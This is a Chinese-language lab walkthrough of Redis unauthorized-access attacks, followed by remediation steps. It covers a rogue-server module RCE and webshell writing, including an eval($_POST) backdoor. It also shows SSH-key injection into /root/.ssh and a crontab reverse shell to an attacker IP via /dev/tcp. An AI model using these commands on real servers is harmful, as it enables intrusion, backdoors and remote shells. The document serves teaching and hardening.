## redis未授权访问(CNVD-2019-21763)
### 漏洞简介
Redis是一个开源的使用ANSI C语言编写、支持网络、可基于内存亦可持久化的日志型、Key-Value[数据库](https://cloud.tencent.com/solution/database?from=10680)，并提供多种语言的API。作为一个高性能的key-value数据库，Redis在部分场景下对关系数据库起到很好的补充作用。
2019年7月7日，LC/BC的成员Pavel Toporkov在WCTF2019 Final分享会上介绍了Redis新版本的远程命令执行漏洞的利用方式。由于在Reids 4.x及以上版本中新增了模块功能，攻击者可通过外部拓展，在Redis中实现一个新的Redis命令。攻击者可以利用该功能引入模块，在未授权访问的情况下使被攻击服务器加载恶意.so 文件，从而实现远程代码执行。
​

### 影响版本
Redis 2.x，3.x，4.x，5.x
​

### 实验环境
**靶机：Debian(192.168.0.1)，redis版本为4.0.14**
**攻击机：kali Linux(192.168.0.138)**




### 利用过程
**下载exp到本地：**[**https://github.com/vulhub/redis-rogue-getshell**](https://github.com/vulhub/redis-rogue-getshell)
```php
git clone https://github.com/vulhub/redis-rogue-getshell.git
```
**下载完成后，解压压缩包，然后进入到redis-rogue-getshell/RedisModulesSDK/exp目录下编译exp.so文件**
```php
unzip redis-rogue-getshell.zip
cd redis-rogue-getshell/RedisModulesSDK/exp
make
```
![image.png](https://cdn.nlark.com/yuque/0/2021/png/1660081/1636688339988-0eec7238-32af-4ef2-b57b-27cd684a0595.png?x-oss-process=image%2Fresize%2Cw_1500%2Climit_0)

编译完成后会在当前目录下会生成一个exp.so，将其复制到redis-rogue-server目录下**
![image.png](https://cdn.nlark.com/yuque/0/2021/png/1660081/1636688396869-abde3d47-4bbf-4263-9954-618f6a4660e0.png?x-oss-process=image%2Fresize%2Cw_1500%2Climit_0)
**使用redis-master.py脚本攻击执行命令**

```php
python3 redis-master.py --rhost 192.168.0.1 --rport 6379 --lhost 192.168.0.138 			--lport 9999 -f exp.so -c whoami
```
![image.png](https://cdn.nlark.com/yuque/0/2021/png/1660081/1636688512051-49eb5e5e-5792-44e2-bb5e-b038caed5cfe.png#clientId=u7f791b78-e769-4&from=paste&height=351&id=ubf00a693&margin=%5Bobject%20Object%5D&name=image.png&originHeight=702&originWidth=1918&originalType=binary&ratio=1&size=1339701&status=done&style=none&taskId=uf73887cd-0af1-47b1-b53f-cd546f531e0&width=959)

### 修复方式
1. 禁止Redis服务对公网开放，可通过修改redis.conf配置文件中的"#bind 127.0.0.1" ，去掉前面的"#"即可（Redis本来就是作为内存数据库，只要监听在本机即可）；
2. 设置密码访问认证，可通过修改redis.conf配置文件中的"requirepass" 设置复杂密码 （需要重启Redis服务才能生效）；
3. 对访问源IP进行访问控制，可在防火墙限定指定源ip才可以连接Redis服务器；
4. 修改Redis默认端口，将默认的6379端口修改为其他端口；
5. 禁用config指令避免恶意操作，在Redis配置文件redis.conf中配置rename-command项"RENAME_CONFIG"，这样即使存在未授权访问，也能够给攻击者使用config 指令加大难度；
6. Redis使用普通用户权限，禁止使用 root 权限启动Redis 服务，这样可以保证在存在漏洞的情况下攻击者也只能获取到普通用户权限，无法获取root权限；

## redis未授权访问(CNVD-2015-07557)
### 漏洞简介
Redis是一套开源的使用ANSIC编写、支持网络、可基于内存亦可持久化的日志型、键值存储数据库，并提供多种语言的API。Redis默认情况下会开启6379端口，在未开启认证的情况下，可导致任意用户在可以访问目标服务器的情况下未授权访问Redis，读取Redis的数据。该漏洞在较早前就已经被发现，而近期研究者给出了更为危险的利用方法。攻击者可利用Redis的相关方法，将自己的公钥写入目标服务器 /root/.ssh 文件夹的authotrized_keys文件中，进而可以直接登录目标服务器。CNVD对该漏洞的综合评级为“高危”。
​

### 影响版本
Redis 2.x,3.x,4.x,5.x


### 漏洞利用条件
1. Redis服务以root账户运行；
2. Redis无密码或弱密码进行认证；
3. Redis监听在0.0.0.0公网上；
​

### 漏洞危害
1. 攻击者无需认证访问到内部数据，可能导致敏感信息泄露，黑客也可以恶意执行flushall来清空所有数据
2. 攻击者可通过EVAL执行lua代码，或通过数据备份功能往磁盘写入后门文件；
3.如果Redis以root身份运行，黑客可以给root账户写入SSH公钥文件，直接通过SSH登录受害服务器
​

### 环境安装
```php
cd /tmp
wget http://download.redis.io/releases/redis-2.8.17.tar.gz
tar xzf redis-2.8.17.tar.gz
cd redis-2.8.17
make
#启动redis服务
/tmp/redis-2.8.17/src/redis.server /tmp/redis-2.8.17/redis.conf
```
### 利用过程
#### 方法一：利用redis写webshell
**利用条件：**

- 在攻击机上能用redis-cli无密码成功连接
- 目标机开启WEB服务，具有web目录下的写权限和网站绝对路径

**写入一个shell.php文件到网站根目录下**
```php
redis-cli -h 192.168.0.1
config set dir /var/www/html/
config set dbfilename shell.php
set shell "\r\n\r\n<?php phpinfo();?>\r\n\r\n"
save
```
![image.png](https://cdn.nlark.com/yuque/0/2021/png/1660081/1636635985449-04f3f758-2755-421d-8f5a-caf5b59d513a.png#clientId=uc5668306-5437-4&from=paste&height=194&id=ubfa90e95&margin=%5Bobject%20Object%5D&name=image.png&originHeight=387&originWidth=1469&originalType=binary&ratio=1&size=55579&status=done&style=none&taskId=u35cbd23e-86a9-4c68-92e5-9cffdae0c58&width=734.5)
**成功访问shell.php**
![image.png](https://cdn.nlark.com/yuque/0/2021/png/1660081/1636636132544-f00a3f8a-1e6a-476d-ac49-ba6339e67665.png#clientId=uc5668306-5437-4&from=paste&height=291&id=u0d6ae24e&margin=%5Bobject%20Object%5D&name=image.png&originHeight=581&originWidth=1739&originalType=binary&ratio=1&size=108523&status=done&style=none&taskId=ua194f329-22a5-472c-8c4d-4bb4ebc592b&width=869.5)
**当数据库过大时，redis写shell的小技巧：**
```php
<?php 
set_time_limit(0);
$fp=fopen('wtf.php','w');
fwrite($fp,'<?php @eval($_POST[\"mmbns233\"]);?>');
exit();
?>
```
#### 方法二：利用redis写入ssh公钥实现免密登录
**利用条件：**

- 目标主机开启ssh服务
- 目标主机/root/.ssh/目录存在
- 目标主机redis服务以root权限启动，允许写入公钥到/root/.ssh/目录下

**在本地生成ssh密钥对**
```php
cd /root/.ssh
  ssh-keygen
  (echo -e "\n\n"; cat id_rsa.pub; echo -e "\n\n") > pub.txt
```
![image.png](https://cdn.nlark.com/yuque/0/2021/png/1660081/1636636311906-86c5f9d1-9128-4671-9cd2-7aad2ffbd6ea.png#clientId=uc5668306-5437-4&from=paste&height=480&id=udcbad894&margin=%5Bobject%20Object%5D&name=image.png&originHeight=960&originWidth=1654&originalType=binary&ratio=1&size=114255&status=done&style=none&taskId=u264aab5c-4f9e-4508-acdc-9fcfa4a0cb3&width=827)**连接 Redis写入公钥**
```php
cat pub.txt | ./redis-cli -h 192.168.0.1  -x set pub
redis-cli -h 192.168.0.1
config set dir /root/.ssh/
config get dir
config set dbfilename "authorized_keys"
save
```
![image.png](https://cdn.nlark.com/yuque/0/2021/png/1660081/1636636589344-5ce5b3c5-b4ae-46e4-abd2-f19a4dacce26.png#clientId=uc5668306-5437-4&from=paste&height=272&id=u53c12f89&margin=%5Bobject%20Object%5D&name=image.png&originHeight=544&originWidth=1617&originalType=binary&ratio=1&size=61017&status=done&style=none&taskId=ue5da9aca-6daa-41d9-a55e-3a9d11fa46e&width=808.5)
**免密登录到目标主机上**
```php
ssh root@192.168.0.1
```
![image.png](https://cdn.nlark.com/yuque/0/2021/png/1660081/1636636634996-335a7cc5-4918-420a-a0bd-ab666c2c43c7.png#clientId=uc5668306-5437-4&from=paste&height=265&id=u55bdf0ce&margin=%5Bobject%20Object%5D&name=image.png&originHeight=530&originWidth=1812&originalType=binary&ratio=1&size=95796&status=done&style=none&taskId=ue4282bd2-b00e-4010-bd8f-73cf01e59b4&width=906)**

#### 方法三：利用crontab反弹Shell
**在本地启动nc监听8888端口**
```php
nc -lvp 8888
```
![image.png](https://cdn.nlark.com/yuque/0/2021/png/1660081/1636638623270-ad0b87eb-70ff-4d08-b2b3-ced72a3563d1.png#clientId=uc5668306-5437-4&from=paste&height=295&id=u5a019736&margin=%5Bobject%20Object%5D&name=image.png&originHeight=590&originWidth=1508&originalType=binary&ratio=1&size=26177&status=done&style=none&taskId=u206c22c3-e66f-4c40-916c-730c42624b1&width=754)
**crontab任务计划文件文件路径**
[linux](https://so.csdn.net/so/search?from=pc_blog_highlight&q=linux)通用路径：/etc/crontab
ubuntu被编辑的文件路径一般为：/var/spool/cron/crontabs/当前用户
centos被编辑的文件路径一般为：/var/spool/cron/当前用户
**连接redis，写入反弹shell(下面以Centos系统为例)**
```php
redis-cli -h 192.168.0.1
set xxx "\n\n*/1 * * * * /bin/bash -i>&/dev/tcp/192.168.0.3/8888 0>&1\n\n"
config set dir /var/spool/cron/
config set dbfilename root
save
```
![image.png](https://cdn.nlark.com/yuque/0/2021/png/1660081/1636684966736-28650949-f878-4f3a-a34a-a53158ffe4c6.png#clientId=u7f791b78-e769-4&from=paste&height=233&id=u40cc133f&margin=%5Bobject%20Object%5D&name=image.png&originHeight=466&originWidth=1443&originalType=binary&ratio=1&size=494822&status=done&style=none&taskId=ue9a6b89e-e833-4c04-9382-7ed8684b9b7&width=721.5)
**过一分钟后成功反弹Shell**
![image.png](https://cdn.nlark.com/yuque/0/2021/png/1660081/1636685123772-abd4e4ff-1b7d-45ab-aba7-10e881ac99ae.png#clientId=u7f791b78-e769-4&from=paste&height=243&id=u426260e7&margin=%5Bobject%20Object%5D&name=image.png&originHeight=485&originWidth=1840&originalType=binary&ratio=1&size=864266&status=done&style=none&taskId=u0645b92e-bdda-42b1-a443-dafa56a41e6&width=920)
​

### 漏洞修复
1. 禁止Redis服务对公网开放，可通过修改redis.conf配置文件中的"#bind 127.0.0.1" ，去掉前面的"#"即可（Redis本来就是作为内存数据库，只要监听在本机即可）；
2. 设置密码访问认证，可通过修改redis.conf配置文件中的"requirepass" 设置复杂密码 （需要重启Redis服务才能生效）；
3. 对访问源IP进行访问控制，可在防火墙限定指定源ip才可以连接Redis服务器；
4. 修改Redis默认端口，将默认的6379端口修改为其他端口；
5. 禁用config指令避免恶意操作，在Redis配置文件redis.conf中配置rename-command项"RENAME_CONFIG"，这样即使存在未授权访问，也能够给攻击者使用config 指令加大难度；
6. Redis使用普通用户权限，禁止使用 root 权限启动Redis 服务，这样可以保证在存在漏洞的情况下攻击者也只能获取到普通用户权限，无法获取root权限；

